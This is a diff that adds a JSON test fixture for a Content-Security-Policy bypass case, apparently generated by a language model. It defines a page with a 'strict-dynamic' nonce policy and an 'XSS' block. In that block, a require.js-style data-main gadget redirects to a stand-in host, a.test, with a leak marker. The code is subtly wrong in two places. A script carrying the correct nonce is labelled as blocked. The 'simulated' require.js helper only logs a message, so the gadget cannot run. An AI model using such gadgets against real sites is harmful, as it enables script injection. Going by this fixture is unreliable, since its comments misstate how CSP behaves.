@@ -1,0 +1,18 @@
+```json
+{
+  "f1432358": {
+    "url_queue.txt": "https://leak.test/CSP/f1432358/main\nhttps://a.test/report/?leak=baseline\n",
+    "leak.test": {
+      "main": {
+        "index.html": "<!DOCTYPE html>\n<head>\n<meta charset=\"utf-8\">\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none';script-src 'nonce-random' 'strict-dynamic'\">\n</head>\n<body>\n\n<!-- XSS start -->\n<script nonce=\"random\">alert(0)//This is blocked</script>\n<script data-main='data:,document.location.href=\"https://a.test/report/?leak=f1432358\"'></script>\n<script src=\"https://a.test/CSP/f1432358/helper\"></script>\n<!-- XSS end -->\n\n</body>\n</html>\n"
+      },
+      "helper": {
+        "index.js": "// This file simulates the require.js script\nconsole.log('This simulates require.js execution.');\n"
+      }
+    }
+  }
+}
+```
+
+
+Prompt tokens: 22036Completion tokens: 246Total tokens: 22282
